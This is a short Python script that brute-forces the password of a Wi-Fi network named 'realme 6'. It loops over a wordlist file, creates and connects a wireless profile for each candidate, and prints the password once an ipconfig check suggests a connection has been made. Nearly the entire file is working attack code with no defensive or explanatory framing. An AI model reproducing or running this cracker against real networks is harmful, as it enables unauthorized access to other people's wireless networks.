import profile
from time import sleep
import functions
from subprocess import run as srun

def check_password(name,password):
    profile.create(name,SSID,password)
    profile.connect(name)
    sleep(0.8)
    if check_connected():
        print(f"--------\npassword cracked:{password},SSID={SSID},filename={name}\n----------")
        return True
    return False
    



def check_connected():
    ob = srun(["ipconfig"],shell=True,capture_output=True,text=True)
    return True if "255.255.255.0" in ob.stdout else False
    



empty_limit = 5
SSID = "realme 6"
password_list = "passwords_1.txt"



passfile = open(password_list,"r")
run = True
empty = 0
name = "100"
while run:
    #--------reading next password----------------
    if empty == empty_limit:
        print(f"empty passwords exceeded the limit:_{empty_limit}_")
        break
    password = passfile.readlines(1)
    if password:
        password = functions.remove_backslash(password[0])
        print(f"trying with:password={password},SSID={SSID},filename={name}")
        
    else:
        empty +=1
        print("empty_password")
        continue
    #--------check password------------------------
    if check_password(name,password):
        run = False
    name = str(int(name)+1)

    
    
    







passfile.close()








#profile.delete(name,"aa")

#profile.create("aa",SSID,password)

#connect(name,SSID)
